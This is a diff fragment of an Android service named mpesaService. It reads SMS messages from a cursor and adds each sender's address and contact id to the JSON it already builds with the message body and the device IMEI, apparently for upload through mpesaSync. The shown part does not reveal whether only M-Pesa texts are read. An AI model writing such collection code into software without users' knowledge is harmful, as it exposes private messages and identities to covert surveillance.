@@ -52,11 +52,16 @@ public final class mpesaService extends Service {
                 if (cursor.moveToFirst()) {
                     for (int idx = 0; idx < cursor.getCount(); idx++) {
                         String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                        String person = cursor.getString(cursor.getColumnIndexOrThrow("person"));
+
                         JSONObject jo = new JSONObject();
                         JSONArray ja = new JSONArray();
                         try {
                             jo.put("imei", imei);
                             jo.put("msg", msg);
+                            jo.put("address", address);
+                            jo.put("person", person);
                             ja.put(jo);
                             mpesaSync.mpesaSync(ja);
                             cursor.moveToNext();
